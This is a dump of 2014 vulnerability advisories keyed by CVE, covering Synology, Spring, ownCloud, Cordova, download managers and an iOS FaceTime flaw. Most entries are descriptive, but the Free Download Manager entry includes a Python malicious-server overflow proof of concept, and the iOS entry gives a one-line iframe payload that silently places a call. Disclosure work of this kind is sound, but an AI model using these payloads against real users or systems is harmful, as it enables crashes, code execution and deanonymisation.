should fix problem. Attempted to verify with security testing of Beta 2.15.
Verified that issue has been resolved.
Sun, 3/30/14: Notified by author that fixed version (2.15) has been
uploaded
Sun, 3/30/14: Vulnerability disclosure posted
XXI. Disclaimer
The information contained within this advisory is supplied ""as-is"" with no
warranties or guarantees of fitness of use or otherwise. Stora accepts no
responsibility for any damage caused by the use or misuse of this
information.
-----BEGIN PGP SIGNATURE-----
Version: Encryption Desktop 10.3.2 (Build 15238)
Charset: us-ascii
wsBVAwUBUzl9EWRzm/FWea0uAQjX8gf/Ts6IWfPbMFeir5PxDrvQ2VWBNCESgODN
GgJQZaj6339ZxIMFC6IYoD4Uvx223igSB+OyYHLmGZOnQoES7Ilj2Or5Afe71Cqe
ExqYe2fTaZeyruWTgmPA296W3EEoT+Cedeyy5k0+sxK4ahKZ2DQgM/WIDDHU3X/B
nAJZWob+r2f2tQr+OBhy7saMEix9QMNeAEZCa+JJ8az9gxe6+AU9kdmwj9hPy+qc
ZDODMOSyvYojfuvE0oy0AyZ1OBWVpI9lSCI6wmUT6ihOpruz3OKQT+e1HyFoBvmX
aafzW7VlbxgS3EQRC25EWj61BYVIy7OpIFfOzymyBnL/qb0PTBmiDA==
=rmxn
-----END PGP SIGNATURE-----"
7134,CVE-2013-6955 Synology DSM remote code execution,,CVE-2013-6955,"Products Affected By CVE-2013-6955
Diskstation Manager
4.0
4.2
4.3 4.3-3810
Vendor: Synology
Status: Patched
webman/imageSelector.cgi in Synology DiskStation Manager (DSM) 4.0 before 4.0-2259, 4.2 before 4.2-3243, and 4.3 before 4.3-3810 Update 1 allows remote attackers to append data to arbitrary files, and consequently execute arbitrary code, via a pathname in the SLICEUPLOAD X-TMP-FILE HTTP header.
http://www.synology.com/en-global/company/news/article/437
February 14, 2014�Synology� confirmed known security issues (reported as CVE-2013-6955 and CVE-2013-6987) which would cause compromise to file access authority in DSM. An updated DSM version resolving these issues has been released accordingly.
The followings are possible symptoms to appear on affected DiskStation and RackStation:
Exceptionally high CPU usage detected in Resource Monitor:
CPU resource occupied by processes such as dhcp.pid, minerd, synodns, PWNED, PWNEDb, PWNEDg, PWNEDm, or any processes with PWNED in their names
Appearance of non-Synology folder:
An automatically created shared folder with the name �startup�, or a non-Synology folder appearing under the path of �/root/PWNED�
Redirection of the Web Station:
�Index.php� is redirected to an unexpected page
Appearance of non-Synology CGI program:
Files with meaningless names exist under the path of �/usr/syno/synoman�
Appearance of non-Synology script file:
Non-Synology script files, such as �S99p.sh�, appear under the path of �/usr/syno/etc/rc.d�
If users identify any of above situation, they are strongly encouraged to do the following:
For DiskStation or RackStation running on DSM 4.3, please follow the instruction here (http://www.synology.com/en-global/support/faq/348) to REINSTALL DSM 4.3-3827.
For DiskStation or RackStation running on DSM 4.0, it�s recommended to REINSTALL DSM 4.0-2259 or onward from Synology Download Center.
For DiskStation or RackStation running on DSM 4.1 or DSM 4.2, it�s recommended to REINSTALL DSM 4.2-3243 or onward from Synology Download Center (http://www.synology.com/en-global/support/download).
Confidentiality Impact Complete (There is total information disclosure, resulting in all system files being revealed.)
Integrity Impact Complete (There is a total compromise of system integrity. There is a complete loss of system protection, resulting in the entire system being compromised.)
Availability Impact Complete (There is a total shutdown of the affected resource. The attacker can render the resource completely unavailable.)
Access Complexity Low (Specialized access conditions or extenuating circumstances do not exist. Very little knowledge or skill is required to exploit. )
Authentication Not required (Authentication is not required to exploit the vulnerability.)
Gained Access None
Vulnerability Type(s) Execute Code
This is also known as the /PWNED or /lolz hack."
7135,MS14-010 CVE-2014-0293 Technical Details and Code(I changed the web permanently),,CVE-2014-0293,"Origin:
Visit http://technet.microsoft.com/en-us/security/bulletin/ms14-010
Check ""Acknowledgments"" for ""CVE-2014-0293"".
It says ""Dieyu"" and links to my website http://dieyu.org/
Technical Details:
showModalDialog to keep script running, HTTP redirecting to target domain.
Then script will run in target domain.
Code:
This is the file that I sent to Microsoft:
http://dieyu.org/insider2.zip
SHA1: f50b5aebdc7cd0a62f1ed97d776fe4b7fa47260e
MD5: bfdaa2a329ea639a363a4ba8c294f706
Best Wishes,
PS
Background:
This is exactly the XSS vulnerability that made IE fall in 2004:
""US Government warns against Internet Explorer""
http://www.theinquirer.net/inquirer/news/1037530/us-government-warns-internet-explorer
""Vulnerability Note VU#713878"", ""HTTP Redirection"", ""showModalDialog""
http://www.kb.cert.org/vuls/id/713878
Microsoft had not fixed it properly for a decade.
I am the original author of this vulnerability.
I made IE market share fall in 2004, and changed the web permanently.
Back then, there was no ""Local Machine Zone Lockdown"", and XSS could get remote code execution.
Dieyu dieu deus deva divine dio theos dievas dewa ilu Diyin Ayóo Átʼéii atua tiānzhŭ Yahweh Zeus Odin El
It's cross ""language family"".
For English ""divine"", I could have chosen ""deity"".
For Chinese ""tiānzhŭ"", I could have chosen ""tien""(天 Wade-Giles, meaning: sky/god/day).
666-6openonhead-6thsectionoftwohands-itiskeyboard-pointfingerdownandhituponeverybitoflanguage
If you know EXACTLY what this means, please reply this message.
(http://en.wikipedia.org/wiki/Eternal_sin
""tasted the heavenly gift ... fallen away"")
This is the ultimate wisdom:
http://dieyu.org/inithorn.zip
SHA1: 0f8252760f9b43a48840fc3e6f5a2c3c6a9846ec
MD5: 1eccee83f4f9eeab95415f1bfd8ce5bd
You will learn the ultimate wisdom from 6 sources - east and west.
It should cost 10 minutes(max). View inithorn.txt first.
Got this name ""Dieyu"" from sky when I was born:
There was an extremely huge butterfly(""die""), and extremely heavy rain(""yu"").
Follow Dieyu at Twitter: https://twitter.com/liudieyu"
7173,[CVE-2014-2087] Free Download Manager CDownloads_Deleted::UpdateDownload() Buffer Overflow Remote Code Execution,,CVE-2014-2087,"RCE Security Advisory
http://www.rcesecurity.com
1. ADVISORY INFORMATION
-----------------------
Product: Free Download Manager
Vendor URL: www.freedownloadmanager.org
Type: Stack-based Buffer Overflow [CWE-121]
Date found: 2014-02-20
Date published: 2014-02-13
CVSSv2 Score: 9,3 (AV:N/AC:M/Au:N/C:C/I:C/A:C)
CVE: CVE-2014-2087
2. CREDITS
----------
This vulnerability was discovered and researched by Julien Ahrens from
RCE Security.
3. VERSIONS AFFECTED
--------------------
Free Download Manager v3.9.3 build 1360 (latest)
Free Download Manager v3.8 build 1173
Free Download Manager v3.0 build 852
and other older versions may be affected too.
4. VULNERABILITY DESCRIPTION
----------------------------
A stack-based buffer overflow vulnerability has been identified in the
Free Download Manager.
The application parses download requests, which are added to the
download queue, but does not properly validate the length of the
complete download queue object when itï¿½s removed from the queue by the
user. The following function from fdm.exe (source file:
Downloads_Deleted.cpp) is triggered on deletion:
void CDownloads_Deleted::UpdateDownload(int iItem)
This function reads the filename of the download object using
CDownloads_Tasks::GetFileName into szFile and adds the whole URL value
as a description (in brackets) via an insecure strcat() sequence to
szFile during the queue deletion process.
Since the application follows HTTP 301 redirects, an attacker who
controls the target HTTP server is able to send arbitrary long filename
values to exploit this flaw. If the complete name of the queued download
exceeds the size of szFile (10000 bytes), strcat() writes outside the
expected memory boundaries.
This leads to a stack-based buffer overflow with an overwritten SEH
chain or return points, resulting in remote code execution. Successful
exploits can allow remote attackers to execute arbitrary code with the
privileges of the user running the application. Failed exploits will
result in a denial-of-service condition.
This vulnerability is also exploitable locally via ""File->Import->Import
list of downloads""
5. VULNERABLE CODE PART
-----------------------
// Downloads_Deleted.cpp
void CDownloads_Deleted::UpdateDownload(int iItem)
{
vmsDownloadSmartPtr dld = (fsDownload*)GetItemData (iItem);
CHAR szFile [10000];
CDownloads_Tasks::GetFileName (dld, szFile);
lstrcat (szFile, "" ("");
lstrcat (szFile, dld->pMgr->get_URL ());
lstrcat (szFile, "")"");
SetItemText (iItem, 0, szFile);
[..]
}
6. PROOF-OF-CONCEPT (PYTHON)
----------------------------
#!/usr/bin/python
from socket import *
from time import sleep
host = ""192.168.0.1""
port = 80
s = socket(AF_INET, SOCK_STREAM)
s.bind((host, port))
s.listen(1)
print "" [+] Listening on %d ..."" % port
cl, addr = s.accept()
print ""[+] Connection accepted from %s"" % addr[0]
junk0 = ""x43"" * 9000
payload = junk0
buffer = ""HTTP/1.1 301 Moved Permanently ""
buffer += ""Date: Thu, 20 Feb 2014 11:31:08 GMT ""
buffer += ""Server: Apache/2.2.22 (Debian) ""
buffer += ""Location: ""+ payload + "" ""
buffer += ""Vary: Accept-Encoding ""
buffer += ""Content-Length: 8000 ""
buffer += ""Keep-Alive: timeout=5, max=100 ""
buffer += ""Connection: Keep-Alive ""
buffer += ""Content-Type: text/html; charset=iso-8859-1 ""
buffer += "" ""
buffer += ""<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> ""
buffer += ""<html><head> ""
buffer += ""<title>301 Moved Permanently</title> ""
buffer += ""</head><body> ""
buffer += ""<h1>Moved Permanently</h1> ""
buffer += ""<p>The document has moved <a
href=""""+payload+"""">here</a>.</p> ""
buffer += ""</body></html> ""
print cl.recv(1000)
cl.send(buffer)
print ""[+] Sending buffer: OK ""
sleep(1)
cl.close()
s.close()
7. SOLUTION
-----------
None
8. REPORT TIMELINE
------------------
2014-02-20: Discovery of the vulnerability
2014-02-21: Vendor Notification #1 with preset disclosure date (2014-03-09)
2014-02-24: MITRE assigns CVE-2014-2087
2014-02-25: Vendor Notification #2
2014-02-26: Vendor Notification #3
2014-03-05: Vendor Response
2014-03-05: Vulnerability details sent to vendor
2014-03-09: RCE Security asks for a status update
2014-03-13: No response from vendor
2014-03-13: Full Disclosure according to disclosure policy
9. REFERENCES
-------------
http://www.rcesecurity.com/2014/03/cve-2014-2087-free-download-manager-cdownloads_deleted-updatedownload-remote-code-execution"
7188,PowerArchiver: Uses insecure legacy PKZIP encryption when AES is selected (CVE-2014-2319),,CVE-2014-2319,"PowerArchiver: Uses insecure legacy PKZIP encryption when AES is
selected (CVE-2014-2319)
References
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-2319
http://int21.de/cve/CVE-2014-2319-powerarchiver.html
http://www.powerarchiver.com/2014/03/12/powerarchiver-2013-14-02-05-released/
Background
ftp://utopia.hacktic.nl/pub/crypto/cracking/pkzip.ps.gz
Description
The compression tool PowerArchiver version 14.02.03 creates files with
an insecure encryption method even if the user selects a (secure) AES
encryption in the GUI.
If a user clicks on the ""Encrypt Files"" and selects ""AES 256-bit"" for
encryption, the outcoming file will not be AES-encrypted. It will
instead use the legacy PKZIP encryption, which uses a broken
encryption algorithm.
Note that there are different ways in PowerArchiver to create an
encrypted ZIP file, the issue only appears when using the ""Encrypt
Files""-Button.
The PKZIP encryption has been broken by Biham/Kocher in 1994.
The vendor ConeXware has released version 14.02.05 which fixes the
issue. It also disables completely support for creating archives with
the broken legacy ZIP encryption.
Disclosure Timeline
2014-03-10: Issue found, vendor contacted
2014-03-10: Vendor replies, confirms issue
2014-03-12: Vendor publishes fixed version
--
Hanno Böck
http://hboeck.de/
mail/jabber: hanno hboeck de
GPG: BBB51E42"
7194,CVE-2014-1222 - Local File Inclusion in Vtiger CRM,,CVE-2014-1222,"Vulnerability title: Local File Inclusion in Vtiger CRM
CVE: CVE-2014-1222
Vendor: Vtiger
Product: CRM
Affected version: Vtiger CRM 5.4.0, 6.0 RC & 6.0.0 GA
Fixed version: Vtiger CRM 6.0.0 Security patch 1
Reported by: Jerzy Kramarz
Details:
A local file inclusion vulnerability was discovered in the 'kcfinder'
component of the vtiger CRM 6.0 RC. This could be exploited to include
arbitrary files via directory traversal sequences and subsequently
disclose contents of arbitrary files.
Further details at:
https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2014-1222/
Copyright:
Copyright (c) Portcullis Computer Security Limited 2014, All rights
reserved worldwide. Permission is hereby granted for the electronic
redistribution of this information. It is not to be edited or altered in
any way without the express written consent of Portcullis Computer
Security Limited.
Disclaimer:
The information herein contained may change without notice. Use of this
information constitutes acceptance for use in an AS IS condition. There
are NO warranties, implied or otherwise, with regard to this information
or its use. Any use of this information is at the user's risk. In no
event shall the author/distributor (Portcullis Computer Security
Limited) be held liable for any damages whatsoever arising out of or in
connection with the use or spread of this information."
7195,CVE-2014-2043 - SQL Injection in Procentia IntelliPen,,CVE-2014-2043,"Vulnerability title: SQL Injection in Procentia IntelliPen
CVE: CVE-2014-2043
Vendor: Procentia
Product: IntelliPen
Affected version: 1.1.12.1520
Fixed version: 1.1.18.1658
Reported by: Jerzy Kramarz
Details:
SQL injection has been found and confirmed within the software as an
authenticated user. A successful attack could allow an authenticated
attacker to access information such as usernames and password hashes
that are stored in the database.
Further details at:
https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2014-2043/
Copyright:
Copyright (c) Portcullis Computer Security Limited 2014, All rights
reserved worldwide. Permission is hereby granted for the electronic
redistribution of this information. It is not to be edited or altered in
any way without the express written consent of Portcullis Computer
Security Limited.
Disclaimer:
The information herein contained may change without notice. Use of this
information constitutes acceptance for use in an AS IS condition. There
are NO warranties, implied or otherwise, with regard to this information
or its use. Any use of this information is at the user's risk. In no
event shall the author/distributor (Portcullis Computer Security
Limited) be held liable for any damages whatsoever arising out of or in
connection with the use or spread of this information."
7197,CVE-2014-1904 XSS when using Spring MVC,,CVE-2014-1904,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
CVE-2014-1904 XSS when using Spring MVC
Severity: Moderate
Vendor: Spring by Pivotal
Versions Affected:
- - Spring MVC 3.0.0 to 3.2.8
- - Spring MVC 4.0.0 to 4.0.1
- - Earlier unsupported versions may be affected
Description:
When a programmer does not specify the action on the Spring form, Spring
automatically populates the action field with the requested uri. An atacker can
use this to inject malicious content into the form.
Mitigation:
Users of affected versions should apply the following mitigation:
- - Users of 3.x should upgrade to 3.2.8 or later
- - Users of 4.x should upgrade to 4.0.2 or later
Credit:
This issue was discovered and reported responsibly to the Pivotal security team
by Paul Wowk of CAaNES LLC.
References:
https://jira.springsource.org/browse/SPR-11426
https://github.com/spring-projects/spring-framework/commit/741b4b229ae032bd17175b46f98673ce0bd2d485
History:
2014-Mar-11: Initial vulnerability report published.
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.9 (MingW32) - WinPT 1.2.0
iQIcBAEBAgAGBQJTH4RmAAoJEKSZXFdK82Xa9cgP/jrsKO2583HNfsIfglZxcnEY
YpKlCbqNeXzwEuACTJGdsilH57Q1mx7CuMGSBUjDi/ayiKfWmlhdZapkvVc8qdPC
2yUeYjKpj70MGedzWODMEPYdpM0bfqpmYep5HPioYA/jj3xQBrcZSQ1FAMCWzSTF
FWyqbkB3qO9F80Vs/E2wKbH/Qm4pEOiaxQg+moCut/RLHYlWKGRFt+ujqd7EUnzY
mGyeUR419F97pA2juF1GAh68R+z2mvwupPMCnc6naMPXtOuZoLZfAwJEoyqdQTyD
NpnKJfeF2PCAGSPT0tlvgyxsW08zVb6QQv2WvKcQMqyDYYqnMpedUK9ZmtykNXYo
ehQjRqSFy/amf+LPdJzYn8Z3bC49RLeOjkRNrWL2tj0gq9gn/PbZNcQxxT1u+z4C
md1TDdv8/N8M8GKc61exm1wnVedPHbanCeYc5g7+fkQm0qu0qmQzHmls3jRedWH2
XqHQ63w4/hpv/tD0YESK+wvXXAP359kqTUmJ3GOhYOAJ9+K4dxyCLXUIsfif4wTq
cJ6yubaLTMI50b+tzfxV0WsF+ez6MEyfXJoNXR8LfEOiTIUWC/5boslrAtAPKgpS
X+ISd4qHLj6AyjoqfBTLSpZecP4RNtxRPJsC04RgKx2yMIjxlO8nghu4z5xYe0L0
d/vOAj1idcQotv/g92jl
=msWo
-----END PGP SIGNATURE-----"
7198,CVE-2014-0097 Spring Security Blank password may bypass user authentication,,CVE-2014-0097,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
CVE-2014-0097 Blank password may bypass user authentication
Severity: Important
Vendor: Spring by Pivotal
Versions Affected:
- - Spring Security 3.2.0 to 3.2.1
- - Spring Security 3.1.0 to 3.1.5
Description:
The ActiveDirectoryLdapAuthenticator does not check the password length. If the
directory allows anonymous binds then it may incorrectly authenticate a user who
supplies an empty password.
Mitigation:
Users of affected versions should apply the following mitigation:
- - Users of 3.2.x should upgrade to 3.2.2
Credit:
This issue was identified by the Spring Development team.
References:
http://www.gopivotal.com/security/cve-2014-0097
https://jira.springsource.org/browse/SEC-2500
https://github.com/spring-projects/spring-security/commit/88559882e967085c47a7e1dcbc4dc32c2c796868
https://github.com/spring-projects/spring-security/commit/7dbb8e777ece8675f3333a1ef1cb4d6b9be80395
https://github.com/spring-projects/spring-security/commit/a7005bd74241ac8e2e7b38ae31bc4b0f641ef973
History:
2014-Mar-11: Initial vulnerability report published.
2014-Mar-11: Affected versions corrected to add 3.1.0 to 3.1.5
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.9 (MingW32) - WinPT 1.2.0
iQIcBAEBAgAGBQJTH4PiAAoJEKSZXFdK82XakpEP/AofBt17ZjSs4MeFcgm/zt1e
tad8nNlYPRxjoUQYexNGLAu6JPIdaaZ1dZib+6vLwX3iKpMNq2dikkiVFk9qPSQY
It/o58+n3e+La5KiEKpUHUnFuUfaOrcI6iojDlb/tIRKZB3UR8c8X562rYNDsMAJ
QgAFaEvlxtNlB273Dq3AuIugpKB1E3Ivk2AFw9n7esutvKac42S8RaCw3FM+t8Hp
OsbkroB8OE9qfi/MSh4loLZDdHakYgRy/mdW/5FYzrnbiOUNIzeyph3KiWFb5col
ox2k9DEDsBbve/jATg/hsL0NvOIIqWA7mO+K/8XiGo4OnUkcDginCrEx01r36YLM
wHIfnjQp6tgngFMC1sJBqaYH5bQ4p6HSiYwWutUTRvRUoXDe3YvPra37lWtgVfAv
otYmZ8BZiQrzMiE5J1UIshekJV6dEhani3kyi3htCvOiBCS2+YMYzKgg16OgVcf5
JYmQKk/yE+ZEeWdTmM0gGK44axUQVNWZpG84JG/n7gDU+/yNO//93/vnID2JE5VK
CzAcP2fazzK4D2u5t1k7JNfArDJ82SrVjEzY0RuZiu+ui/32kidIJY757rMbPV1k
+wiE9429N4vsOisHavNladmUGl2vb5ImcVHiDy6ZyXyF8Xu4lE5YuhLzA5qZ4Ta/
n96+1qDQQZB4HhRKAnIZ
=XpO8
-----END PGP SIGNATURE-----"
7199,CVE-2014-0054 Spring MVC Incomplete fix for CVE-2013-4152 / CVE-2013-6429 (XXE),,CVE-2014-0054,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
CVE-2014-0054 Incomplete fix for CVE-2013-4152 / CVE-2013-6429 (XXE)
Severity: Important
Vendor: Spring by Pivotal
Versions Affected:
- - Spring MVC 3.0.0 to 3.2.8
- - Spring MVC 4.0.0 to 4.0.1
- - Earlier unsupported versions may be affected
Description:
Spring MVC's Jaxb2RootElementHttpMessageConverter also processed user provided
XML and neither disabled XML external entities nor provided an option to disable
them. Jaxb2RootElementHttpMessageConverter has been modified to provide an
option to control the processing of XML external entities and that processing is
now disabled by default.
Mitigation:
Users of affected versions should apply the following mitigation:
- - Users of 3.x should upgrade to 3.2.8 or later
- - Users of 4.x should upgrade to 4.0.2 or later
Credit:
This issue was reported to the Spring Framework developers by Spase Markovski.
References:
http://www.gopivotal.com/security/cve-2014-0054
https://jira.springsource.org/browse/SPR-11376
https://github.com/spring-projects/spring-framework/commit/edba32b3093703d5e9ed42b5b8ec23ecc1998398#diff-1f3f1d5cdab9ac92d1ca5ec7def8f131
History:
2014-Mar-11: Initial vulnerability report published.
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.9 (MingW32) - WinPT 1.2.0
iQIcBAEBAgAGBQJTH4LYAAoJEKSZXFdK82XaOD4P/RQEwgJaQxHpx+WG1z0dvf5K
DuG+p/O+E0zruuTdVZMTdg+i+o3PSBQ/8xjnAJw0S8DeLAClZPC8h/bHr4C1Hy2A
Fd9UIQF0Tuci4nUpaBkYjMsq/DIznhMCI3Md0dclYNj/X9j+mocFiRzhFDI4/2yx
kfN62ks9DMe9YZhc3jqzB01MLnqmx2zVXRX7t1YUrcUpdvgz0m2Cp/xoU4urAf7G
Jggiggc4z9iGJ9B4fbvhJ10jLeNjCf0xI+s612Uq4wQC/+5sZDwaE9BaIiBBS/bI
60nePuGzuGlcXlERPSiswO4U7evBXLJAHWsReMjJODf0+j+LheRUdeqBDGx+MlQ2
1Nz6L/EzYfX3AEm0rLhE1Y51oV2BfkIT5zT0aCb1xZY5Ujwqv1q6S+bTK0M8HrKv
YYkKvXlAHmBW9t0Yk/ONaXT/b843Y/UJD2Zqd0272y2KmewDmAT7A1b8r8b1Yj5W
2Aw/6/2qVgnWLfgBiY0i+9//POnrmp8wDERVAAix/ePk/Mh+KBZAXThzMy77Vm1R
miFXUCo92y0vAQijavn5lO5rhSuKX0205V61ivY6JLPeVqDxdXi6eptXSZuKe3e7
0XyHieN5zZ6nH+UkKSdUFhMSiGx6fQ0YDQm/4wfj5AqJ8ib1lrj/n4zxhTGTJpfy
KyU96xGT6ig9EuA3Sc+E
=N/VV
-----END PGP SIGNATURE-----"
7204,[CVE-2013-6835] - iOS 7.0.6 Safari/Facetime-Audio Privacy issue,,CVE-2013-6835,"- Affected Vendor: https://www.apple.com/
- Affected Software: Safari/Facetime on iOS
- Affected Version: iOS 7 prior to 7.1
- Issue Type: Lack of user confirmation leading to a call being established, revealing the user's identity (phone number or email address)
- Release Date: March 10, 2014
- Discovered by: Guillaume Ross / @gepeto42
- CVE Identifier: CVE-2013-6835
- Issue Status: Vendor has published iOS 7.1 which resolves this issue by adding a prompt before establishing the call.
**Summary**
Facetime allows video calls for iOS. Facetime-Audio, added in iOS 7, allows audio only calls. The audio version uses a vulnerable URL scheme which is not used by Facetime Video.
The URL Scheme used for Facetime-Audio allows a website to establish a Facetime-audio call to the attacker's account, revealing the phone number or email address of the user browsing the site.
By entering the URL in an inline frame, the attack is automated, and similar to a CSRF attack across apps. Safari does not prompt the user before establishing the call.
**Impact**
A user browsing the web could click a malicious link or load a page containing a malicious link within an inline frame. The user would then automatically contact the phone number or email address specified in the URL, revealing his identity to the attacker.
**Proof of Concept**
Entering the following URL in iOS would trigger the call to the email address specified: facetime-audio://user host com
This inline frame would have the user call the specified email address as soon as the HTML page is loaded, without prompting the user:
<iframe src=""facetime-audio://user host com""></iframe>
Security Content of iOS 7.1: http://support.apple.com/kb/HT6162"
7225,CVE-2014-2044 - Remote Code Execution in ownCloud,,CVE-2014-2044,"Vulnerability title: Remote Code Execution in ownCloud
CVE: CVE-2014-2044
Vendor: ownCloud
Product: ownCloud
Affected version: 4.0.x & 4.5.x
Fixed version: 5.0
Reported by: Alejo Murillo Moya
Details:
A remote code execution has been found and confirmed within ownCloud as
an authenticated user. A successful attack could allow an authenticated
attacker to execute PHP code, which could lead to a full compromise of
the server and associated infrastructure. Please note that only the
Windows versions of ownCloud are affected and that valid credentials are
required.
It is possible to create a custom .htaccess into the user's folder on
Windows version of the application, which will enable PHP execution on
the folder. This vulnerability exists because it is possible to bypass
the internal blacklists using Windows ADS (Alternate Data Streams).
Further details at:
https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2014-2044/
Copyright:
Copyright (c) Portcullis Computer Security Limited 2014, All rights
reserved worldwide. Permission is hereby granted for the electronic
redistribution of this information. It is not to be edited or altered in
any way without the express written consent of Portcullis Computer
Security Limited.
Disclaimer:
The information herein contained may change without notice. Use of this
information constitutes acceptance for use in an AS IS condition. There
are NO warranties, implied or otherwise, with regard to this information
or its use. Any use of this information is at the user's risk. In no
event shall the author/distributor (Portcullis Computer Security
Limited) be held liable for any damages whatsoever arising out of or in
connection with the use or spread of this information."
7233,CVE-2014-1599 - 39 Type-1 XSS in SFR DSL/Fiber Box,,CVE-2014-1599,"CVE-2014-1599
39 Type-1 XSS in SFR ADSL/Fiber Box.
SFR is the french Vodafone (estimated DSL user base of 5.2 Millions).
* affected product:
SFR BOX NB6-MAIN-R3.3.4
* vulnerabilities:
/network/dns
5 non-filtered Type-1 XSS
/network/dhcp
6 non-filtered Type-1 XSS
/network/nat
7 non-filtered Type-1 XSS
/network/route
12 non-filtered Type-1 XSS
/wifi/config
1 non-filtered Type-1 XSS
/network/lan
8 non-filtered Type-1 XSS
* exploitation hypotheses:
- user already logged-in (or tricked by SE techniques to authenticate)
- ip address of the SFR Box router is known (most users use the default
settings: 192.168.1.1/24)
* #number of attack vectors:
39 Type-1 XSS

* exploitation scenario:
If a user is tricked into authenticating into its interface,
an attacker can XSS the user, and thus getting read and write access to
the router configuration webpages.
Such as scenario is mainly possible due to:
- non filtered reflections (mainly Type-1 / reflected)
- lack of Content Security Policy
Moreover, no anti-CSRF token such as view-states are present, thus there
is the possibility of modifying the routing tables even without an XSS,
if the user is authenticated in the box.
A non limitative list of actions include:
- getting authentication credentials (wireless, DSL credentials)
- rebooting the router
- modifying the route table (thus possibility of content injection if
an attacker controlled server is on the route)
- DDOSing a target with numerous XSS'ed clients
* timeline:
- 2013-12-21: discovery
- 2014-01-06: notification to vendor, ask for patch release
- 2014-01-06: vendor acknowledges but does not answer on the patching
timeframe
- 2014-01-20: request for update or planned date of patch release
- 2014-02-25: public disclosure"
7242,[CVE-2014-0072] Apache Cordova File-Transfer insecure defaults,,CVE-2014-0072,"CVE-2014-0072: Apache Cordova File-Transfer insecure defaults
Severity: Important
Vendor:
The Apache Software Foundation
Versions Affected:
Cordova File-Transfer iOS plugin from Cordova versions 2.4.0 to 2.9.0
Cordova File-Transfer iOS standalone plugin (org.apache.cordova.file-transfer) versions 0.1.0 to 0.4.1
Description:
The default value of the trustAllHosts was set to true on iOS. This has
been the case since Cordova 2.4.0 and has now been rectified in the latest
version of the plugin (v0.4.2). We recommend affected projects update their
plugin, or work around the issue by explicitly setting the parameter to
false when using the FileTransfer API.
Upgrade path:
Developers using the File-Transfer plugin in their applications should
upgrade to version 0.4.2
Credit:
This issue was discovered by Neil Bergman of Cigital, Inc."
7243,[CVE-2014-0073] Apache Cordova In-App-Browser privilege escalation,,CVE-2014-0073,"CVE-2014-0073: Apache Cordova In-App-Browser privilege escalation
Severity: Important
Vendor:
The Apache Software Foundation
Versions Affected:
Cordova In-App-Browser iOS plugin from Cordova versions 2.6.0 to 2.9.0
Cordova In-App-Browser iOS standalone plugin (org.apache.cordova.inappbrowser) versions 0.1.0 to 0.3.1
Description:
An exploit was found in the InAppBrowser plugin that would allow a
malicious site to execute arbitrary JavaScript in the host page. The
problem has been fixed in the latest version of the plugin (v0.3.2). We
recommend affected projects update their plugin.
Upgrade path:
Developers using the In-App Browser plugin in their applications should
upgrade to version 0.3.2
Credit:
This issue was discovered by Neil Bergman of Cigital, Inc."
7249,[CVE-2014-2206] GetGo Download Manager HTTP Response Header Buffer Overflow Remote Code Execution,,CVE-2014-2206,"RCE Security Advisory
http://www.rcesecurity.com
1. ADVISORY INFORMATION
-----------------------
Product: GetGo Download Manager
Vendor URL: www.getgosoft.com
Type: Stack-based Buffer Overflow [CWE-121]
Date found: 2014-02-20
Date published: 2014-03-02
CVSSv2 Score: 10,0 (AV:N/AC:L/Au:N/C:C/I:C/A:C)
CVE: CVE-2014-2206
2. CREDITS
----------
This vulnerability was discovered and researched by Julien Ahrens from
RCE Security.
3. VERSIONS AFFECTED
--------------------
GetGo Download Manager v4.9.0.1982 (latest)
GetGo Download Manager v4.8.2.1346
GetGo Download Manager v4.4.5.502
and other older versions may be affected too.
4. VULNERABILITY DESCRIPTION
----------------------------
A stack-based buffer overflow vulnerability has been identified in the
GetGo Download Manager.
When a website is requested for download, the application reads the HTTP
Response Header values of the target page and copies the retrieved
values to a temporary buffer, which is set to a fixed size of 4097
bytes, but this size is not used by the application to limit the input
to the buffer. Instead it fills the buffer byte by byte until the
terminating sequence "" "" is found. Therefore the application writes
outside the expected memory boundaries if the HTTP Response Header is
greater than 4097 bytes.
This leads to a stack-based buffer overflow with an overwritten SEH
chain or return points, resulting in remote code execution. Successful
exploits can allow remote attackers to execute arbitrary code with the
privileges of the user running the application. Failed exploits will
result in a denial-of-service condition.
5. PROOF-OF-CONCEPT (DEBUG)
---------------------------
Registers:
EAX 00000000
ECX CCCCCCCC
EDX 76F2B4AD ntdll.76F2B4AD
EBX 00000000
ESP 0474BD5C
EBP 0474BD7C
ESI 00000000
EDI 00000000
EIP CCCCCCCC
C 0 ES 002B 32bit 0(FFFFFFFF)
P 1 CS 0023 32bit 0(FFFFFFFF)
A 0 SS 002B 32bit 0(FFFFFFFF)
Z 1 DS 002B 32bit 0(FFFFFFFF)
S 0 FS 0053 32bit 7EF94000(FFF)
T 0 GS 002B 32bit 0(FFFFFFFF)
D 0
O 0 LastErr ERROR_SUCCESS (00000000)
EFL 00010246 (NO,NB,E,BE,NS,PE,GE,LE)
ST0 empty g
ST1 empty g
ST2 empty g
ST3 empty g
ST4 empty g
ST5 empty g
ST6 empty g
ST7 empty g
3 2 1 0 E S P U O Z D I
FST 0000 Cond 0 0 0 0 Err 0 0 0 0 0 0 0 0 (GT)
FCW 027F Prec NEAR,53 Mask 1 1 1 1 1 1
Stack:
ESP-8 > 00286D30
ESP-4 > FFFFFFFE
ESP ==> > 76F2B499 RETURN to ntdll.76F2B499
ESP+4 > 0474BE44
ESP+8 > 0474D3A8
[...]
ESP+1648 > CCCCCCCC
ESP+164C > CCCCCCCC Pointer to next SEH record
ESP+1650 > CCCCCCCC SE handler
ESP+1654 > CCCCCCCC
6. VULNERABLE CODE PART
-----------------------
// GetGoDM.exe
004A4CE1 PUSH ECX ; /Arg3
004A4CE2 PUSH 1001 ; |Arg2 = 00001001
004A4CE7 LEA EDX,DWORD PTR SS:[EBP-1024] ; |
004A4CED PUSH EDX ; |Arg1
004A4CEE MOV ECX,DWORD PTR SS:[EBP-1064] ; |
004A4CF4 CALL GetGoDM.004A3A70 ; GetGoDM.004A3A70
004A3A70 PUSH EBP
004A3A71 MOV EBP,ESP
